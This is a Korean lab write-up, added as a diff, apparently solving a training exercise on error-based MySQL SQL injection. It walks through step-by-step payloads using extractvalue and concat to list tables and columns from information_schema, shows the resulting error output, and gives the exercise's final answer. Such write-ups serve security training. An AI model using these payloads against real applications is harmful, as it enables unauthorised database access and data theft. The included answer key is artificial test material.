@@ -1,0 +1,43 @@
+과제 내용
+
+==============================
+
+* SQL Injection MySQL 문제 6번
+
+==============================
+
+1. 풀이과정
+1. 쿼리문 유추 
+select * from 게시판 where 제목 like '%__검색어__%'
+
+eqst%' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1))) and 'k%'='k
+
+
+2. 공격포인트
+SELECT * FROM INFORMATION_SCHEMA.COLUMNS
+
+검색어: eqst%' AND extractvalue(1, concat(0x3a, (__공격구문__))) and 'k%'='k
+검색어: eqst%' AND extractvalue(1, concat(0x3a, ('EQST'))) and 'k%'='k
+error code : [1105] XPATH syntax error: ':EQST'
+
+eqst%' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1,1))) and 'k%'='k
+error code : [1105] XPATH syntax error: ':comm_file'
+
+3.테이블명 1 row씩 : 3번째 열이 eqst_answer을 확인
+ eqst%' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 3(1부터 시작),1))) and 'k%'='k
+ 
+
+ 4. 컬럼명 
+  SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'eqst_answer';
+  
+eqst%' AND extractvalue(1, concat(0x3a, (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'eqst_answer'))) and 'k%'='k
+error code : [1105] XPATH syntax error: ':answer_column
+
+ answer_column열에서 답찾으면 끝
+SELECT answer_column FROM eqst_answer;
+
+eqst%' AND extractvalue(1, concat(0x3a, (SELECT answer_column FROM eqst_answer))) and 'k%'='k
+
+2. 정답
+정답 : skinfosec_eqst_lms_system
+==============================
